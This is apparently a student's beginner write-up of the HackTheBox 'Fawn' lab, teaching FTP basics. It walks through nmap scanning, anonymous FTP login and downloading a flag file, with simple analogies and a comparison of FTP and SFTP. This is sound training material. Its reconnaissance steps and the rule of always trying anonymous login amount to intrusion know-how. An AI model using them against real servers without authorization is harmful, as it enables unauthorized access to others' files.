# 🦌 Fawn — HackTheBox Writeup

> **Platform:** HackTheBox | **Category:** Starting Point | **Difficulty:** ⭐ Very Easy | **Topic:** FTP | **Written by:** Chamith De Silva

---

## 🧠 What This Machine Is About

Fawn is a Starting Point machine on HackTheBox. It teaches you about **FTP (File Transfer Protocol)** — a very old and commonly used protocol for transferring files between computers over a network.

The weakness here is a **misconfigured FTP server** that allows anyone to login using the username `anonymous` with any password — giving free access to the files stored on the server!

> 💡 Think of this machine like a company file room that is supposed to be locked — but someone forgot to set a password on the guest account. Anyone who walks in and says "I am anonymous" can access all the files inside!

---

## 📌 Key Concept — What is FTP?

FTP stands for **File Transfer Protocol**. It is one of the oldest protocols used to transfer files between two computers over a network.

| Thing | What it means (simple) |
|-------|------------------------|
| **FTP** | File Transfer Protocol — used to transfer files between computers |
| **Port 21** | The default port FTP runs on — always look for this! |
| **Anonymous login** | A special FTP feature that lets anyone login without a real password |
| **Misconfiguration** | Admin left anonymous login enabled — anyone can access the files! |
| **Man in the Middle Attack** | FTP has no encryption — attackers can intercept files being transferred |

> 💡 FTP is like sending files through the post without putting them in an envelope — anyone who intercepts the package along the way can read everything inside! That is why SFTP was created later.

---

## 🛠️ Tools Used

| Tool | Purpose | Simple Example |
|------|---------|---------------|
| `ping` | Check if target machine is alive | Like calling someone's phone to see if they are home |
| `nmap` | Scan for open ports and services | Like checking which doors are open in a building |
| `ftp` | Connect to the FTP server | Like opening a file sharing app to access remote files |
| `help` | Show available commands inside FTP | Like asking a librarian what services are available |
| `ls` | List files in the FTP directory | Like looking inside a folder on your computer |
| `get` | Download a file from FTP server | Like clicking download on a file sharing website |
| `bye` | Exit the FTP shell | Like logging out and closing the app |
| `cat` | Read the contents of a downloaded file | Like opening and reading a text file |

---

## ⚙️ Full Attack — Step by Step

### ✅ STEP 1 — Connect to VPN

```bash
sudo openvpn {vpn_file_name}.ovpn
```

> 💡 HackTheBox machines are inside a private network. The VPN is like a special pass that lets you enter that network from outside. Always connect first before doing anything!

---

### ✅ STEP 2 — Confirm Target is Alive

```bash
ping {target_IP}
```

Press `Ctrl+C` after 2-3 replies.

> 💡 Think of ping like throwing a small ball at the target machine. If the ball comes back, you know someone is there! If nothing comes back, the machine is off or unreachable — check your VPN first!

| What you see | What it means |
|---|---|
| 64 bytes from {IP}: icmp_seq=1... | Target is alive and reachable ✅ |
| Request timeout / no response | Target is unreachable ❌ — check VPN! |

---

### ✅ STEP 3 — Basic Nmap Scan

```bash
nmap {target_IP}
```

**What you find:**

```
PORT   STATE  SERVICE
21/tcp open   ftp
```

> 💡 Port 21 is open and FTP is running! FTP is used to share files between computers over a network. Think of it like a remote file cabinet that you can access over the internet!

---

### ✅ STEP 4 — Detailed Nmap Scan

Now we want more details about the FTP service:

```bash
nmap {target_IP} -p 21 -sC -sV
```

| Flag | Meaning (simple) |
|------|-----------------|
| `-p 21` | Only scan port 21 — no need to scan everything again |
| `-sC` | Run default scripts — checks for anonymous login! |
| `-sV` | Show what version of FTP software is running |

Also try:

```bash
sudo nmap -sV {target_IP}
```

> 💡 Think of `-sC` like sending a detective to knock on the door and ask questions — it finds out extra details like whether anonymous login is allowed!

> 📝 **From the results you will see:**
> `ftp-anon: Anonymous FTP login allowed` — this is our way in!

---

### ✅ STEP 5 — Check FTP Capabilities (Optional)

```bash
ftp -?
```

> 💡 This shows you all the options available for the ftp command. Like reading the manual before using a new tool!

---

### ✅ STEP 6 — Connect to FTP Server

```bash
ftp {target_IP}
```

When asked for login:

```
Name: anonymous
Password: (type anything — even just press Enter)
```

Your terminal changes to:

```
ftp>
```

> 👑 You are now inside the FTP server!

> 💡 Anonymous FTP login is like a library that lets anyone walk in and read books without showing an ID. The admin forgot to disable this feature — so we just walk straight in!

> 📝 **RULE:** When you find FTP running, always try anonymous login first!

---

### ✅ STEP 7 — See Available Commands

```bash
help
```

> 💡 The help command shows you all the commands available inside the FTP shell. Always check this when you enter a new shell — just like we did in the SMB shell during the Dancing machine!

---

### ✅ STEP 8 — List Files in FTP Directory

```bash
ls
```

You will see a file called **flag.txt**!

> 💡 ls inside the FTP shell works just like ls in Linux — it shows you what files are available on the remote server!

---

### ✅ STEP 9 — Download the Flag File

```bash
get flag.txt
```

The file is now downloaded to your local machine!

> 💡 get is like clicking the download button on a file sharing website. It copies the file from the remote FTP server to your own computer!

---

### ✅ STEP 10 — Exit the FTP Shell

```bash
bye
```

> 💡 bye is how you exit the FTP shell and close the connection. Think of it like logging out of a website before closing the browser!

---

### ✅ STEP 11 — Read the Flag

Back in your normal Kali terminal:

```bash
ls
cat flag.txt
```

> 🏁 Copy the flag value and submit it on HackTheBox. **Machine owned!**

> ⚠️ **Important:** `cat` only works in your Kali terminal — NOT inside the FTP shell! Always exit with `bye` first!

---

## 🗺️ Simple Attack Summary

```
Connect VPN
     ↓
ping → confirm target is alive
     ↓
nmap → find port 21 (FTP open!)
     ↓
nmap -p 21 -sC -sV → confirm anonymous login allowed
     ↓
ftp {target_IP} → login as anonymous with any password
     ↓
help → see available commands
     ↓
ls → find flag.txt
     ↓
get flag.txt → download the flag
     ↓
bye → exit FTP shell
     ↓
cat flag.txt → read and capture the flag! 🏁
```

---

## 🔑 Key Lessons to Remember

| # | Lesson | Why It Matters |
|---|--------|---------------|
| 1 | Port 21 = FTP | Always check for FTP when you see port 21 open |
| 2 | Always try anonymous login on FTP | Many misconfigured FTP servers allow anonymous access |
| 3 | `-sC` flag in nmap | Runs scripts that check for anonymous FTP login |
| 4 | `-sV` flag in nmap | Shows version of software — useful for finding vulnerabilities |
| 5 | `get` downloads files from FTP | This is how you retrieve files from a remote FTP server |
| 6 | `bye` exits the FTP shell | Always properly exit shells when done |
| 7 | FTP has no encryption | Everything sent over FTP can be intercepted — very insecure! |
| 8 | `cat` only works outside FTP shell | Exit with `bye` first, then use `cat` in Kali terminal |

---

## 📖 Extra Knowledge — FTP vs SFTP

| Feature | FTP | SFTP |
|---------|-----|------|
| Full name | File Transfer Protocol | Secure File Transfer Protocol |
| Year created | 1971 (very old!) | 1997 |
| Encryption | ❌ None — plain text | ✅ Fully encrypted |
| Security | ❌ Very insecure | ✅ Secure |
| Port | 21 | 22 (same as SSH) |
| Still used? | Yes — but should be avoided | Yes — the secure standard today |

> 💡 FTP is like sending a postcard with your files written on it — anyone handling it along the way can read everything. SFTP is like putting your files in a locked safe before sending — only the receiver has the key!

---

## 🔐 Bonus — What is a Man in the Middle Attack?

A **Man in the Middle (MitM) attack** is when an attacker secretly intercepts communication between two computers.

> 💡 **Real life example:** Imagine you are passing a note to your friend in class, but someone sitting between you secretly reads the note and even changes it before passing it on — that is a Man in the Middle attack!

Because FTP sends everything without encryption, an attacker on the same network can easily do this. This is exactly why FTP is considered insecure — and why modern systems use SFTP instead!

---

## ⚠️ Common Mistakes to Avoid

- Forgetting to connect VPN before starting
- Typing the wrong username — it must be exactly `anonymous`
- Not knowing that you can type anything as the password
- Forgetting to run `ls` before `get` — always check what files exist first!
- Running `cat flag.txt` while still inside the FTP shell — exit with `bye` first!

---

> **Fawn completed! Keep going — you are doing amazing! 💪**

*📝 Written by: Chamith De Silva | Cybersecurity & Digital Forensics Student @ Kingston University, UK*

*🔗 More writeups: [CTF-Writeups Repository](https://github.com/dechamithsilva/CTF-Writeups)*
